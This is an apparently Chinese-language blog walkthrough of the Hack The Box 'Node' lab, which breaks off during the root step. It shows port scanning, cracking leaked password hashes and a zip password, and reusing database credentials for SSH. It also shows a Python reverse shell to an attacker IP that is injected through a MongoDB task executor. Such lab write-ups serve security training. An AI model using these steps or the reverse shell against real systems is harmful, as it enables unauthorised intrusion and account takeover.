<!DOCTYPE html>
<html>
<head>
    

    

    



    <!-- hexo-inject:begin --><!-- hexo-inject:end --><meta charset="utf-8">
    
    
    
    
    <title>Node - Hackthebox | Lucifiel&#39;s Blog | Lucifiel 技术博客</title>
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
    
    <meta name="theme-color" content="#3F51B5">
    
    
    <meta name="keywords" content="Hackthebox">
    <meta name="description" content="Hackthebox - Node靶场信息  靶场类型  信息收集Nmap┌──(root㉿lucifiel)-[~&#x2F;Desktop] └─# nmap -sS -sC -sV -A -p- --min-rate 5000 10.10.10.58 Starting Nmap 7.92 ( https:&#x2F;&#x2F;nmap.org ) at 2022-07-12 09:40 CST Nmap scan re">
<meta property="og:type" content="article">
<meta property="og:title" content="Node - Hackthebox">
<meta property="og:url" content="http://www.lucifiel.com/2022/08/01/Hackthebox/Hackthebox-Node/index.html">
<meta property="og:site_name" content="Lucifiel&#39;s Blog">
<meta property="og:description" content="Hackthebox - Node靶场信息  靶场类型  信息收集Nmap┌──(root㉿lucifiel)-[~&#x2F;Desktop] └─# nmap -sS -sC -sV -A -p- --min-rate 5000 10.10.10.58 Starting Nmap 7.92 ( https:&#x2F;&#x2F;nmap.org ) at 2022-07-12 09:40 CST Nmap scan re">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="http://www.lucifiel.com/2022/08/01/Hackthebox/Hackthebox-Node/1696fad6-1739-400f-9bd9-90de4805f3d0.png">
<meta property="og:image" content="http://www.lucifiel.com/2022/08/01/Hackthebox/Hackthebox-Node/e672c742-1d71-49b3-8eb7-6c7e6075f1b1.png">
<meta property="og:image" content="http://www.lucifiel.com/2022/08/01/Hackthebox/Hackthebox-Node/b12e40e3-bf31-441b-be2f-8f9cd55e0a69.png">
<meta property="og:image" content="http://www.lucifiel.com/2022/08/01/Hackthebox/Hackthebox-Node/61183a1a-65fc-4b2c-a797-a855894e682b.png">
<meta property="og:image" content="http://www.lucifiel.com/2022/08/01/Hackthebox/Hackthebox-Node/fe9af40b-2fd9-4dbb-8855-1c9235d7f2d9.png">
<meta property="og:image" content="http://www.lucifiel.com/2022/08/01/Hackthebox/Hackthebox-Node/b3fb1d76-8f41-4e86-929f-b8694d6abe2e.png">
<meta property="article:published_time" content="2022-08-01T11:38:36.000Z">
<meta property="article:modified_time" content="2023-06-13T03:47:47.021Z">
<meta property="article:author" content="Lucifiel">
<meta property="article:tag" content="Hackthebox">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="http://www.lucifiel.com/2022/08/01/Hackthebox/Hackthebox-Node/1696fad6-1739-400f-9bd9-90de4805f3d0.png">
    
        <link rel="alternate" type="application/atom+xml" title="Lucifiel&#39;s Blog" href="/atom.xml">
    
    <link rel="shortcut icon" href="/favicon.ico">
    <link rel="stylesheet" href="//unpkg.com/hexo-theme-material-indigo@latest/css/style.css">
    <script>window.lazyScripts=[]</script>

    <!-- custom head -->
    

<meta name="generator" content="Hexo 4.2.1"><!-- hexo-inject:begin --><!-- hexo-inject:end --></head>

<body>
    <!-- hexo-inject:begin --><!-- hexo-inject:end --><div id="loading" class="active"></div>

    <aside id="menu" class="hide" >
  <div class="inner flex-row-vertical">
    <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="menu-off">
        <i class="icon icon-lg icon-close"></i>
    </a>
    <div class="brand-wrap" style="background-image:url(/img/brand.jpg)">
      <div class="brand">
        <a href="/" class="avatar waves-effect waves-circle waves-light">
          <img src="/img/avatar.jpg">
        </a>
        <hgroup class="introduce">
          <h5 class="nickname">Lucifiel</h5>
          <a href="mailto:LucifielHack@qq.com" title="LucifielHack@qq.com" class="mail">LucifielHack@qq.com</a>
        </hgroup>
      </div>
    </div>
    <div class="scroll-wrap flex-col">
      <ul class="nav">
        
            <li class="waves-block waves-effect">
              <a href="/"  >
                <i class="icon icon-lg icon-home"></i>
                主页
              </a>
            </li>
        
            <li class="waves-block waves-effect">
              <a href="/archives"  >
                <i class="icon icon-lg icon-archives"></i>
                Archives
              </a>
            </li>
        
            <li class="waves-block waves-effect">
              <a href="/tags"  >
                <i class="icon icon-lg icon-tags"></i>
                Tags
              </a>
            </li>
        
            <li class="waves-block waves-effect">
              <a href="/categories"  >
                <i class="icon icon-lg icon-th-list"></i>
                Categories
              </a>
            </li>
        
            <li class="waves-block waves-effect">
              <a href="https://github.com/LucifielHack" target="_blank" >
                <i class="icon icon-lg icon-github"></i>
                Github
              </a>
            </li>
        
            <li class="waves-block waves-effect">
              <a href="/about"  >
                <i class="icon icon-lg icon-user"></i>
                About
              </a>
            </li>
        
      </ul>
    </div>
  </div>
</aside>

    <main id="main">
        <header class="top-header" id="header">
    <div class="flex-row">
        <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light on" id="menu-toggle">
          <i class="icon icon-lg icon-navicon"></i>
        </a>
        <div class="flex-col header-title ellipsis">Node - Hackthebox</div>
        
        <div class="search-wrap" id="search-wrap">
            <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="back">
                <i class="icon icon-lg icon-chevron-left"></i>
            </a>
            <input type="text" id="key" class="search-input" autocomplete="off" placeholder="输入感兴趣的关键字">
            <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="search">
                <i class="icon icon-lg icon-search"></i>
            </a>
        </div>
        
        
        <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="menuShare">
            <i class="icon icon-lg icon-share-alt"></i>
        </a>
        
    </div>
</header>
<header class="content-header post-header">

    <div class="container fade-scale">
        <h1 class="title">Node - Hackthebox</h1>
        <h5 class="subtitle">
            
                <time datetime="2022-08-01T11:38:36.000Z" itemprop="datePublished" class="page-time">
  2022-08-01
</time>


            
        </h5>
    </div>

    


</header>


<div class="container body-wrap">
    
    <aside class="post-widget">
        <nav class="post-toc-wrap post-toc-shrink" id="post-toc">
            <h4>TOC</h4>
            <ol class="post-toc"><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#Hackthebox-Node"><span class="post-toc-text">Hackthebox - Node</span></a></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#靶场信息"><span class="post-toc-text">靶场信息</span></a></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#靶场类型"><span class="post-toc-text">靶场类型</span></a></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#信息收集"><span class="post-toc-text">信息收集</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#Nmap"><span class="post-toc-text">Nmap</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#Http"><span class="post-toc-text">Http</span></a></li></ol></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#漏洞利用"><span class="post-toc-text">漏洞利用</span></a></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#权限提升"><span class="post-toc-text">权限提升</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#Tom"><span class="post-toc-text">Tom</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#Root"><span class="post-toc-text">Root</span></a></li></ol></li></ol>
        </nav>
    </aside>


<article id="post-Hackthebox/Hackthebox-Node"
  class="post-article article-type-post fade" itemprop="blogPost">

    <div class="post-card">
        <h1 class="post-card-title">Node - Hackthebox</h1>
        <div class="post-meta">
            <time class="post-time" title="2022-08-01 19:38:36" datetime="2022-08-01T11:38:36.000Z"  itemprop="datePublished">2022-08-01</time>

            


            
<span id="busuanzi_container_page_pv" title="文章总阅读量" style='display:none'>
    <i class="icon icon-eye icon-pr"></i><span id="busuanzi_value_page_pv"></span>
</span>


        </div>
        <div class="post-content" id="post-content" itemprop="postContent">
            <h1 id="Hackthebox-Node"><a href="#Hackthebox-Node" class="headerlink" title="Hackthebox - Node"></a>Hackthebox - Node</h1><h1 id="靶场信息"><a href="#靶场信息" class="headerlink" title="靶场信息"></a>靶场信息</h1><img src="/2022/08/01/Hackthebox/Hackthebox-Node/1696fad6-1739-400f-9bd9-90de4805f3d0.png" class>

<h1 id="靶场类型"><a href="#靶场类型" class="headerlink" title="靶场类型"></a>靶场类型</h1><img src="/2022/08/01/Hackthebox/Hackthebox-Node/e672c742-1d71-49b3-8eb7-6c7e6075f1b1.png" class>

<h1 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h1><h2 id="Nmap"><a href="#Nmap" class="headerlink" title="Nmap"></a>Nmap</h2><pre><code class="bash">┌──(root㉿lucifiel)-[~/Desktop]
└─# nmap -sS -sC -sV -A -p- --min-rate 5000 10.10.10.58
Starting Nmap 7.92 ( https://nmap.org ) at 2022-07-12 09:40 CST
Nmap scan report for 10.10.10.58
Host is up (0.57s latency).
Not shown: 65533 filtered tcp ports (no-response)
PORT     STATE SERVICE            VERSION
22/tcp   open  ssh                OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 dc:5e:34:a6:25:db:43:ec:eb:40:f4:96:7b:8e:d1:da (RSA)
|   256 6c:8e:5e:5f:4f:d5:41:7d:18:95:d1:dc:2e:3f:e5:9c (ECDSA)
|_  256 d8:78:b8:5d:85:ff:ad:7b:e6:e2:b5:da:1e:52:62:36 (ED25519)
3000/tcp open  hadoop-tasktracker Apache Hadoop
| hadoop-tasktracker-info: 
|_  Logs: /login
|_http-title: MyPlace
| hadoop-datanode-info: 
|_  Logs: /login
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Aggressive OS guesses: Linux 3.2 - 4.9 (92%), Crestron XPanel control system (90%), Linux 3.13 (89%), Linux 3.16 (89%), ASUS RT-N56U WAP (Linux 3.4) (87%), Linux 3.1 (87%), Linux 3.2 (87%), HP P2000 G3 NAS device (87%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (87%), Linux 3.5 (87%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 22/tcp)
HOP RTT       ADDRESS
1   647.66 ms 10.10.14.1
2   647.71 ms 10.10.10.58

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 93.80 seconds
</code></pre>
<h2 id="Http"><a href="#Http" class="headerlink" title="Http"></a>Http</h2><img src="/2022/08/01/Hackthebox/Hackthebox-Node/b12e40e3-bf31-441b-be2f-8f9cd55e0a69.png" class>

<p>这边首页面看到有个登陆点，直接去看看</p>
<img src="/2022/08/01/Hackthebox/Hackthebox-Node/61183a1a-65fc-4b2c-a797-a855894e682b.png" class>

<p>测试了一下弱口令，没进去，也没什么其他可以点的点了，fuzz 也没找到什么东西</p>
<img src="/2022/08/01/Hackthebox/Hackthebox-Node/fe9af40b-2fd9-4dbb-8855-1c9235d7f2d9.png" class>

<p>在主页抓到一个 js，里面有一个地址 &#x2F;api&#x2F;users，去看一下</p>
<pre><code class="bash">[{&quot;_id&quot;:&quot;59a7365b98aa325cc03ee51c&quot;,&quot;username&quot;:&quot;myP14ceAdm1nAcc0uNT&quot;,&quot;password&quot;:&quot;dffc504aa55359b9265cbebe1e4032fe600b64475ae3fd29c07d23223334d0af&quot;,&quot;is_admin&quot;:true},
{&quot;_id&quot;:&quot;59a7368398aa325cc03ee51d&quot;,&quot;username&quot;:&quot;tom&quot;,&quot;password&quot;:&quot;f0e2e750791171b0391b682ec35835bd6a5c3f7c8d1d0191451ec77b4d75f240&quot;,&quot;is_admin&quot;:false},
{&quot;_id&quot;:&quot;59a7368e98aa325cc03ee51e&quot;,&quot;username&quot;:&quot;mark&quot;,&quot;password&quot;:&quot;de5a1adf4fedcce1533915edc60177547f1057b61b7119fd130e1f7428705f73&quot;,&quot;is_admin&quot;:false},
{&quot;_id&quot;:&quot;59aa9781cced6f1d1490fce9&quot;,&quot;username&quot;:&quot;rastating&quot;,&quot;password&quot;:&quot;5065db2df0d4ee53562c650c29bacf55b97e231e3fe88570abc9edd8b78ac2f0&quot;,&quot;is_admin&quot;:false}]
</code></pre>
<p>去尝试解密一下</p>
<pre><code class="bash">username = myP14ceAdm1nAcc0uNT
password = manchester
</code></pre>
<p>成功解密出 myP14ceAdm1nAcc0uNT 的密码，这是一个管理员账户，去登陆页面登录一下</p>
<h1 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h1><img src="/2022/08/01/Hackthebox/Hackthebox-Node/b3fb1d76-8f41-4e86-929f-b8694d6abe2e.png" class>

<p>成功登陆，然后有一个备份文件可以下载，下载一下</p>
<pre><code class="bash">wget --header &quot;Cookie: connect.sid=s%3AjDIfsWcluCPkFQHEKYIaZu2c5fEgPznp.td17K8ciAiS8uXhzf4h0SM71BuRxWE%2BdLoPQvRI9XkQ&quot; http://10.10.10.58:3000/api/admin/backup
</code></pre>
<p>这个文件下载存在一些问题，尝试多次都会在大概 0.6% 左右的进度停止下载</p>
<p>所以我们用 wget 进行自动多次尝试下载，然后挂着等下载完成吧</p>
<p>如果还是不行，就尝试用 curl 进行请求</p>
<pre><code class="bash">curl -s -XGET -b &#39;connect.sid=s%3AjDIfsWcluCPkFQHEKYIaZu2c5fEgPznp.td17K8ciAiS8uXhzf4h0SM71BuRxWE%2BdLoPQvRI9XkQ&#39; http://10.10.10.58:3000/api/admin/backup -o myplace.backup
</code></pre>
<pre><code class="bash">┌──(root㉿lucifiel)-[~/Desktop]
└─# file myplace.backup 
myplace.backup: ASCII text, with very long lines (64652), with no line terminators
</code></pre>
<p>查看了一下内容和类型，感觉像是 base64 编码，去解码一下</p>
<pre><code class="bash">┌──(root㉿lucifiel)-[~/Desktop]
└─# cat myplace.backup | base64 -d &gt; unknow                                                                                                                               

┌──(root㉿lucifiel)-[~/Desktop]
└─# file unknow 
unknow: Zip archive data, at least v1.0 to extract, compression method=store

┌──(root㉿lucifiel)-[~/Desktop]
└─# mv unknow myplace.zip
</code></pre>
<p>是一个 zip 类型的，那就尝试解压一下</p>
<pre><code class="bash">┌──(root㉿lucifiel)-[~/Desktop]
└─# unzip myplace.zip
Archive:  myplace.zip
   creating: var/www/myplace/
[myplace.zip] var/www/myplace/package-lock.json password:
</code></pre>
<p>需要一个解压密码</p>
<pre><code class="bash">┌──(root㉿lucifiel)-[~/Desktop]
└─# fcrackzip -D -p /usr/share/wordlists/rockyou.txt  myplace.zip
possible pw found: magicword
</code></pre>
<p>解压密码出来了，去解压一下</p>
<pre><code class="bash">┌──(root㉿lucifiel)-[~/Desktop/var/www/myplace]
└─# ls -la
总用量 56
drwxr-xr-x  4 root root  4096  9月  3  2017 .
drwxr-xr-x  3 root root  4096  7月 12 20:24 ..
-rw-rw-r--  1 root root  3861  9月  2  2017 app.html
-rw-rw-r--  1 root root  8058  9月  3  2017 app.js
drwxr-xr-x 69 root root  4096  9月  2  2017 node_modules
-rw-rw-r--  1 root root   283  9月  2  2017 package.json
-rw-r--r--  1 root root 21264  9月  2  2017 package-lock.json
drwxrwxr-x  6 root root  4096  9月  2  2017 static
</code></pre>
<p>有一些文件，到处看看有没有有用的东西吧</p>
<pre><code class="bash">┌──(root㉿lucifiel)-[~/Desktop/var/www/myplace]
└─# grep -Ri password .
</code></pre>
<p>使用上面的命令进行筛选，我们看到有一个 mongodb</p>
<pre><code class="bash">┌──(root㉿lucifiel)-[~/Desktop/var/www/myplace]
└─# cat app.js

const express     = require(&#39;express&#39;);
const session     = require(&#39;express-session&#39;);
const bodyParser  = require(&#39;body-parser&#39;);
const crypto      = require(&#39;crypto&#39;);
const MongoClient = require(&#39;mongodb&#39;).MongoClient;
const ObjectID    = require(&#39;mongodb&#39;).ObjectID;
const path        = require(&quot;path&quot;);
const spawn        = require(&#39;child_process&#39;).spawn;
const app         = express();
const url         = &#39;mongodb://mark:5AYRft73VtFpc84k@localhost:27017/myplace?authMechanism=DEFAULT&amp;authSource=myplace&#39;;
const backup_key  = &#39;45fac180e9eee72f4fd2d9386ea7033e52b7c740afc3d98a8d0230167104d474&#39;;
</code></pre>
<p>查看 app.js 其中和 mangodb 有关的只有 const url 这一句</p>
<p>所以我们到了一个账号密码</p>
<pre><code class="bash">username = mark
password = 5AYRft73VtFpc84k
</code></pre>
<p>目前只有 22 和 3000 端口打开，3000 端口我们已经是 admin 权限了，自然不可能，所以应该是 22 端口</p>
<pre><code class="bash">┌──(root㉿lucifiel)-[~/Desktop]
└─# ssh mark@10.10.10.58                       
The authenticity of host &#39;10.10.10.58 (10.10.10.58)&#39; can&#39;t be established.
ED25519 key fingerprint is SHA256:l5rO4mtd28sC7Bh8t7rHpUxqmHnGYUDxX1DHmLFrzrk.
This key is not known by any other names
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added &#39;10.10.10.58&#39; (ED25519) to the list of known hosts.
mark@10.10.10.58&#39;s password: 

The programs included with the Ubuntu system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.

.-. 
        .-&#39;``(|||) 
     ,`\ \    `-`.                 88                         88 
    /   \ &#39;``-.   `                88                         88 
  .-.  ,       `___:      88   88  88,888,  88   88  ,88888, 88888  88   88 
 (:::) :        ___       88   88  88   88  88   88  88   88  88    88   88 
  `-`  `       ,   :      88   88  88   88  88   88  88   88  88    88   88 
    \   / ,..-`   ,       88   88  88   88  88   88  88   88  88    88   88 
     `./ /    .-.`        &#39;88888&#39;  &#39;88888&#39;  &#39;88888&#39;  88   88  &#39;8888 &#39;88888&#39; 
        `-..-(   ) 
              `-` 

The programs included with the Ubuntu system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.

Last login: Wed Sep 27 02:33:14 2017 from 10.10.14.3
mark@node:~$ whoami&amp;&amp;id
mark
uid=1001(mark) gid=1001(mark) groups=1001(mark)
</code></pre>
<p>成功拿到 user 权限</p>
<p>进来后在用户目录下没有看到 flag 文件</p>
<p>&#x2F;home&#x2F;tom&#x2F;user.txt 通过 find 查找，在 tom 目录下找到了 flag 文件</p>
<pre><code class="bash">mark@node:/home/tom$ cat user.txt 
cat: user.txt: Permission denied
</code></pre>
<p>但是我们没有权限</p>
<h1 id="权限提升"><a href="#权限提升" class="headerlink" title="权限提升"></a>权限提升</h1><h2 id="Tom"><a href="#Tom" class="headerlink" title="Tom"></a>Tom</h2><pre><code class="bash">mark@node:/home$ ps aux | grep tom
tom       1231  0.0  8.6 1033968 65472 ?       Ssl  02:21   0:22 /usr/bin/node /var/www/myplace/app.js
tom       1238  0.0  5.7 1008568 43220 ?       Ssl  02:21   0:07 /usr/bin/node /var/scheduler/app.js
mark     16416  0.0  0.1  14228   932 pts/0    S+   13:43   0:00 grep --color=auto tom
</code></pre>
<p>查看一下 Tom 运行的文件</p>
<pre><code class="bash">mark@node:/home$ cat /var/scheduler/app.js
const exec        = require(&#39;child_process&#39;).exec;
const MongoClient = require(&#39;mongodb&#39;).MongoClient;
const ObjectID    = require(&#39;mongodb&#39;).ObjectID;
const url         = &#39;mongodb://mark:5AYRft73VtFpc84k@localhost:27017/scheduler?authMechanism=DEFAULT&amp;authSource=scheduler&#39;;

MongoClient.connect(url, function(error, db) {
  if (error || !db) {
    console.log(&#39;[!] Failed to connect to mongodb&#39;);
    return;
  }

  setInterval(function () {
    db.collection(&#39;tasks&#39;).find().toArray(function (error, docs) {
      if (!error &amp;&amp; docs) {
        docs.forEach(function (doc) {
          if (doc) {
            console.log(&#39;Executing task &#39; + doc._id + &#39;...&#39;);
            exec(doc.cmd);
            db.collection(&#39;tasks&#39;).deleteOne({ _id: new ObjectID(doc._id) });
          }
        });
      }
      else if (error) {
        console.log(&#39;Something went wrong: &#39; + error);
      }
    });
  }, 30000);

});
</code></pre>
<p>可以看到 &#x2F;var&#x2F;scheduler&#x2F;app.js 连接了名为 scheduler 的 mongodb 数据库，在名为 tasks 的集合中搜索文档并执行 ‘cmd’ 字段</p>
<p>让我们连接到 mongodb 并在任务集合中插入一个新文档。我们希望用户 tom 执行的命令将在“cmd”字段中。</p>
<pre><code class="bash">mark@node:~$ mongo localhost:27017/scheduler -u mark -p 5AYRft73VtFpc84k
MongoDB shell version: 3.2.16
</code></pre>
<pre><code class="bash">db.tasks.insert({&quot;cmd&quot;:&quot;python3 -c &#39;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\&quot;10.10.14.6\&quot;,4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(\&quot;sh\&quot;)&#39;&quot;});
</code></pre>
<p>使用 nc 监听一个端口</p>
<pre><code class="bash">nc -nvlp 4444
</code></pre>
<pre><code class="bash">┌──(root㉿lucifiel)-[~/Desktop]
└─# nc -nvlp 4444                                      
listening on [any] 4444 ...
connect to [10.10.14.6] from (UNKNOWN) [10.10.10.58] 41470
$ python3 -c &#39;import pty;pty.spawn(&quot;/bin/bash&quot;)&#39;;
python3 -c &#39;import pty;pty.spawn(&quot;/bin/bash&quot;)&#39;;
To run a command as administrator (user &quot;root&quot;), use &quot;sudo &lt;command&gt;&quot;.
See &quot;man sudo_root&quot; for details.

tom@node:/$ whoami&amp;&amp;id
whoami&amp;&amp;id
tom
uid=1000(tom) gid=1000(tom) groups=1000(tom),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),115(lpadmin),116(sambashare),1002(admin)
</code></pre>
<p>成功提权到 Tom</p>
<pre><code class="bash">tom@node:~$ pwd
pwd
/home/tom
tom@node:~$ ls   
ls
user.txt
tom@node:~$ cat user.txt
cat user.txt
e1156acc3574e04b06908ecf76be91b1
</code></pre>
<p>成功获取到 user 权限的 flag 文件</p>
<h2 id="Root"><a href="#Root" class="headerlink" title="Root"></a>Root</h2><pre><code class="bash">find / -type f -perm -4000 2&gt;/dev/null
</code></pre>
<p>检查一波 suid 信息 显示 tom 具有的权限</p>
<pre><code class="bash">tom@node:/$ find / -type f -perm -4000 2&gt;/dev/null
find / -type f -perm -4000 2&gt;/dev/null
/usr/lib/eject/dmcrypt-get-device
/usr/lib/snapd/snap-confine
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic
/usr/lib/openssh/ssh-keysign
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/local/bin/backup
/usr/bin/chfn
/usr/bin/at
/usr/bin/gpasswd
/usr/bin/newgidmap
/usr/bin/chsh
/usr/bin/sudo
/usr/bin/pkexec
/usr/bin/newgrp
/usr/bin/passwd
/usr/bin/newuidmap
/bin/ping
/bin/umount
/bin/fusermount
/bin/ping6
/bin/ntfs-3g
/bin/su
/bin/mount
</code></pre>
<p>看起来最异常的就是 &#x2F;usr&#x2F;local&#x2F;bin&#x2F;backup 了</p>
<pre><code class="bash">tom@node:/$ file /usr/local/bin/backup
file /usr/local/bin/backup
/usr/local/bin/backup: setuid ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=343cf2d93fb2905848a42007439494a2b4984369, not stripped
</code></pre>
<p>查看一下文件格式可以确定是一个二进制文件</p>
<p>检查一下文件 &#x2F;var&#x2F;www&#x2F;myplace&#x2F;app.js</p>
<pre><code class="bash">                    &#39;QQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQ&#39;,
          &#39;QQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQ&#39;,
          &#39;QQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQ&#39;,
          &#39;QQQQQQQQQQQQQQQQQQQWQQQQQWWWBBBHHHHHHHHHBWWWQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQ&#39;,
          &#39;QQQQQQQQQQQQQQQD!`__ssaaaaaaaaaass_ass_s____.  -~&quot;&quot;??9VWQQQQQQQQQQQQQQQQQQQ&#39;,
          &#39;QQQQQQQQQQQQQP\&#39;_wmQQQWWBWV?GwwwmmWQmwwwwwgmZUVVHAqwaaaac,&quot;?9$QQQQQQQQQQQQQQ&#39;,
          &#39;QQQQQQQQQQQW! aQWQQQQW?qw#TTSgwawwggywawwpY?T?TYTYTXmwwgZ$ma/-?4QQQQQQQQQQQ&#39;,
          &#39;QQQQQQQQQQW\&#39; jQQQQWTqwDYauT9mmwwawww?WWWWQQQQQ@TT?TVTT9HQQQQQQw,-4QQQQQQQQQ&#39;,
          &#39;QQQQQQQQQQ[ jQQQQQyWVw2$wWWQQQWWQWWWW7WQQQQQQQQPWWQQQWQQw7WQQQWWc)WWQQQQQQQ&#39;,
          &#39;QQQQQQQQQf jQQQQQWWmWmmQWU???????9WWQmWQQQQQQQWjWQQQQQQQWQmQQQQWL 4QQQQQQQQ&#39;,
          &#39;QQQQQQQP\&#39;.yQQQQQQQQQQQP&quot;       &lt;wa,.!4WQQQQQQQWdWP??!&quot;??4WWQQQWQQc ?QWQQQQQ&#39;,
          &#39;QQQQQP\&#39;_a.&lt;aamQQQW!&lt;yF &quot;!` ..  &quot;??$Qa &quot;WQQQWTVP\&#39;    &quot;??\&#39; =QQmWWV?46/ ?QQQQQ&#39;,
          &#39;QQQP\&#39;sdyWQP?!`.-&quot;?46mQQQQQQT!mQQgaa. &lt;wWQQWQaa _aawmWWQQQQQQQQQWP4a7g -WWQQ&#39;,
          &#39;QQ[ j@mQP\&#39;adQQP4ga, -????&quot; &lt;jQQQQQWQQQQQQQQQWW;)WQWWWW9QQP?&quot;`  -?QzQ7L ]QQQ&#39;,
          &#39;QW jQkQ@ jWQQD\&#39;-?$QQQQQQQQQQQQQQQQQWWQWQQQWQQQc &quot;4QQQQa   .QP4QQQQfWkl jQQQ&#39;,
          &#39;QE ]QkQk $D?`  waa &quot;?9WWQQQP??T?47`_aamQQQQQQWWQw,-?QWWQQQQQ`&quot;QQQD\Qf(.QWQQ&#39;,
          &#39;QQ,-Qm4Q/-QmQ6 &quot;WWQma/  &quot;??QQQQQQL 4W&quot;- -?$QQQQWP`s,awT$QQQ@  &quot;QW@?$:.yQQQQ&#39;,
          &#39;QQm/-4wTQgQWQQ,  ?4WWk 4waac -???$waQQQQQQQQF??\&#39;&lt;mWWWWWQW?^  ` ]6QQ\&#39; yQQQQQ&#39;,
          &#39;QQQQw,-?QmWQQQQw  a,    ?QWWQQQw _.  &quot;????9VWaamQWV???&quot;  a j/  ]QQf jQQQQQQ&#39;,
          &#39;QQQQQQw,&quot;4QQQQQQm,-$Qa     ???4F jQQQQQwc &lt;aaas _aaaaa 4QW ]E  )WQ`=QQQQQQQ&#39;,
          &#39;QQQQQQWQ/ $QQQQQQQa ?H ]Wwa,     ???9WWWh dQWWW,=QWWU?  ?!     )WQ ]QQQQQQQ&#39;,
          &#39;QQQQQQQQQc-QWQQQQQW6,  QWQWQQQk &lt;c                             jWQ ]QQQQQQQ&#39;,
          &#39;QQQQQQQQQQ,&quot;$WQQWQQQQg,.&quot;?QQQQ\&#39;.mQQQmaa,.,                . .; QWQ.]QQQQQQQ&#39;,
          &#39;QQQQQQQQQWQa ?$WQQWQQQQQa,.&quot;?( mQQQQQQW[:QQQQm[ ammF jy! j( } jQQQ(:QQQQQQQ&#39;,
          &#39;QQQQQQQQQQWWma &quot;9gw?9gdB?QQwa, -??T$WQQ;:QQQWQ ]WWD _Qf +?! _jQQQWf QQQQQQQ&#39;,
          &#39;QQQQQQQQQQQQQQQws &quot;Tqau?9maZ?WQmaas,,    --~-- ---  . _ssawmQQQQQQk 3QQQQWQ&#39;,
          &#39;QQQQQQQQQQQQQQQQWQga,-?9mwad?1wdT9WQQQQQWVVTTYY?YTVWQQQQWWD5mQQPQQQ ]QQQQQQ&#39;,
          &#39;QQQQQQQWQQQQQQQQQQQWQQwa,-??$QwadV}&lt;wBHHVHWWBHHUWWBVTTTV5awBQQD6QQQ ]QQQQQQ&#39;,
          &#39;QQQQQQQQQQQQQQQQQQQQQQWWQQga,-&quot;9$WQQmmwwmBUUHTTVWBWQQQQWVT?96aQWQQQ ]QQQQQQ&#39;,
          &#39;QQQQQQQQQQWQQQQWQQQQQQQQQQQWQQma,-?9$QQWWQQQQQQQWmQmmmmmQWQQQQWQQW(.yQQQQQW&#39;,
          &#39;QQQQQQQQQQQQQWQQQQQQWQQQQQQQQQQQQQga%,.  -??9$QQQQQQQQQQQWQQWQQV? sWQQQQQQQ&#39;,
          &#39;QQQQQQQQQWQQQQQQQQQQQQQQWQQQQQQQQQQQWQQQQmywaa,;~^&quot;!???????!^`_saQWWQQQQQQQ&#39;,
          &#39;QQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQWWWWQQQQQmwywwwwwwmQQWQQQQQQQQQQQ&#39;,
          &#39;QQQQQQQWQQQWQQQQQQWQQQWQQQQQWQQQQQQQQQQQQQQQQWQQQQQWQQQWWWQQQQQQQQQQQQQQQWQ&#39;,
</code></pre>
<p>看到一个有趣的东西，应该还有其他的东西</p>
<pre><code class="bash">const backup_key  = &#39;45fac180e9eee72f4fd2d9386ea7033e52b7c740afc3d98a8d0230167104d474&#39;;
</code></pre>
<p>拿到了一个 key</p>
<pre><code class="bash">app.get(&#39;/api/admin/backup&#39;, function (req, res) {
    if (req.session.user &amp;&amp; req.session.user.is_admin) {
